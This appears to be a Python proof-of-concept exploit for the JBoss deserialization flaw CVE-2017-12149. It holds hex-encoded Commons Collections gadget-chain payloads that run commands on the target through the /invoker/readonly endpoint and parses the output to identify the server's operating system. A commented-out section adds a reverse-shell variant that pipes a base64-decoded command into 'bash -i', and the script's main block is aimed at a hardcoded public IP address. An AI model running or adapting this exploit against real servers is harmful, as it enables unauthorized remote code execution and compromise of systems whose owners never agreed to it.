#!/usr/bin/env python
# -*- coding: utf-8 -*-
# form https://github.com/1337g/CVE-2017-12149
import requests
import re
import binascii
import secrets

'''
无回显，反弹shell
payload_start_shell = 'ACED0005737200116A6176612E7574696C2E48617368536574BA44859596B8B7340300007870770C000000023F40000000000001737200346F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E6B657976616C75652E546965644D6170456E7472798AADD29B39C11FDB0200024C00036B65797400124C6A6176612F6C616E672F4F626A6563743B4C00036D617074000F4C6A6176612F7574696C2F4D61703B7870740003666F6F7372002A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E6D61702E4C617A794D61706EE594829E7910940300014C0007666163746F727974002C4C6F72672F6170616368652F636F6D6D6F6E732F636F6C6C656374696F6E732F5472616E73666F726D65723B78707372003A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E436861696E65645472616E73666F726D657230C797EC287A97040200015B000D695472616E73666F726D65727374002D5B4C6F72672F6170616368652F636F6D6D6F6E732F636F6C6C656374696F6E732F5472616E73666F726D65723B78707572002D5B4C6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E5472616E73666F726D65723BBD562AF1D83418990200007870000000057372003B6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E436F6E7374616E745472616E73666F726D6572587690114102B1940200014C000969436F6E7374616E7471007E00037870767200116A6176612E6C616E672E52756E74696D65000000000000000000000078707372003A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E496E766F6B65725472616E73666F726D657287E8FF6B7B7CCE380200035B000569417267737400135B4C6A6176612F6C616E672F4F626A6563743B4C000B694D6574686F644E616D657400124C6A6176612F6C616E672F537472696E673B5B000B69506172616D54797065737400125B4C6A6176612F6C616E672F436C6173733B7870757200135B4C6A6176612E6C616E672E4F626A6563743B90CE589F1073296C02000078700000000274000A67657452756E74696D65757200125B4C6A6176612E6C616E672E436C6173733BAB16D7AECBCD5A990200007870000000007400096765744D6574686F647571007E001B00000002767200106A6176612E6C616E672E537472696E67A0F0A4387A3BB34202000078707671007E001B7371007E00137571007E001800000002707571007E001800000000740006696E766F6B657571007E001B00000002767200106A6176612E6C616E672E4F626A656374000000000000000000000078707671007E00187371007E0013757200135B4C6A6176612E6C616E672E537472696E673BADD256E7E91D7B470200007870000000017400'
payload_end_shell = '740004657865637571007E001B0000000171007E00207371007E000F737200116A6176612E6C616E672E496E746567657212E2A0A4F781873802000149000576616C7565787200106A6176612E6C616E672E4E756D62657286AC951D0B94E08B020000787000000001737200116A6176612E7574696C2E486173684D61700507DAC1C31660D103000246000A6C6F6164466163746F724900097468726573686F6C6478703F4000000000000077080000001000000000787878'
a = 'bash -c {echo,d2hvYW1p}|{base64,-d}|{bash,-i}'# whoami
无回显，可以DNSlog外带出来。。。。
payload = binascii.unhexlify(start + build_command_hex(a) + payload_end)
'''
payload_start = [
    'aced0005737200116a6176612e7574696c2e48617368536574ba44859596b8b7340300007870770c000000023f40000000000001737200346f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6b657976616c75652e546965644d6170456e7472798aadd29b39c11fdb0200024c00036b65797400124c6a6176612f6c616e672f4f626a6563743b4c00036d617074000f4c6a6176612f7574696c2f4d61703b7870740003666f6f7372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000067372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e7471007e00037870767200176a6176612e6e65742e55524c436c6173734c6f61646572000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c020000787000000001757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000017672000f5b4c6a6176612e6e65742e55524c3b5251fd24c51b68cd020000787074000e676574436f6e7374727563746f727571007e001a000000017671007e001a7371007e00137571007e0018000000017571007e0018000000017571007e001c000000017372000c6a6176612e6e65742e55524c962537361afce47203000749000868617368436f6465490004706f72744c0009617574686f7269747971007e00154c000466696c6571007e00154c0004686f737471007e00154c000870726f746f636f6c71007e00154c000372656671007e00157870ffffffffffffffff707400052f746d702f74000074000466696c65707874000b6e6577496e7374616e63657571007e001a000000017671007e00187371007e00137571007e00180000000174000e52756e436865636b436f6e6669677400096c6f6164436c6173737571007e001a00000001767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb34202000078707371007e00137571007e0018000000017571007e001a0000000171007e003371007e001e7571007e001a0000000171007e00207371007e00137571007e001800000001757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b470200007870000000017400',
    'aced0005737200116a6176612e7574696c2e48617368536574ba44859596b8b7340300007870770c000000023f40000000000001737200346f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6b657976616c75652e546965644d6170456e7472798aadd29b39c11fdb0200024c00036b65797400124c6a6176612f6c616e672f4f626a6563743b4c00036d617074000f4c6a6176612f7574696c2f4d61703b7870740003666f6f7372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000067372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e7471007e00037870767200176a6176612e6e65742e55524c436c6173734c6f61646572000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c020000787000000001757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000017672000f5b4c6a6176612e6e65742e55524c3b5251fd24c51b68cd020000787074000e676574436f6e7374727563746f727571007e001a000000017671007e001a7371007e00137571007e0018000000017571007e0018000000017571007e001c000000017372000c6a6176612e6e65742e55524c962537361afce47203000749000868617368436f6465490004706f72744c0009617574686f7269747971007e00154c000466696c6571007e00154c0004686f737471007e00154c000870726f746f636f6c71007e00154c000372656671007e00157870ffffffffffffffff707400112f633a2f77696e646f77732f74656d702f74000074000466696c65707874000b6e6577496e7374616e63657571007e001a000000017671007e00187371007e00137571007e00180000000174000e52756e436865636b436f6e6669677400096c6f6164436c6173737571007e001a00000001767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb34202000078707371007e00137571007e0018000000017571007e001a0000000171007e003371007e001e7571007e001a0000000171007e00207371007e00137571007e001800000001757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b470200007870000000017400',
]
payload_end = "71007e002a7571007e001a0000000171007e002c737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000077080000001000000000787878"
ran_a = secrets.SystemRandom().randint(10000000, 20000000)
ran_b = secrets.SystemRandom().randint(1000000, 2000000)
ran_check = ran_a - ran_b
command = ['print goop', 'expr %s - %s' % (ran_a, ran_b), ]
check = [ran_check, '无法初始化设备 PRN', '??????? PRN', 'Unable to initialize device PRN', 'PRN']


def build_command_hex(comm):
    command_exec_hex = "".join("{:02x}".format(ord(c)) for c in comm)
    command_len = len(comm)
    command_len_hex = '{:02x}'.format(command_len)
    command_hex = command_len_hex + command_exec_hex
    # print(command_hex)
    return command_hex


def poc(url):
    proxies = {
        # 'http': '127.0.0.1:1080'
    }
    result = '目标Jboss存在JAVA反序列化漏洞,CVE-2017-12149 : %s' % url
    for start in payload_start:
        for cmd in command:
            payload = binascii.unhexlify(start + build_command_hex(cmd) + payload_end)
            payload_url = "%s/invoker/readonly" % url
            try:
                req = requests.post(payload_url, data=payload, verify=False, timeout=6,)
                res = re.search(b'](.*?)RunCheckConfig', req.content, re.DOTALL)
                if res:
                    ooxx = (res.group(1)).decode('utf-8').strip('\r')
                    # print(ooxx)
                    for c in check:
                        if str(c) in str(ooxx):
                            if 'PRN' in str(ooxx):
                                return result + ' [Windows OS]'
                            else:
                                return result + ' [Linux OS]'
            except:
                pass


if __name__ == "__main__":
    a = poc('http://34.245.191.89:8080')
    print(a)
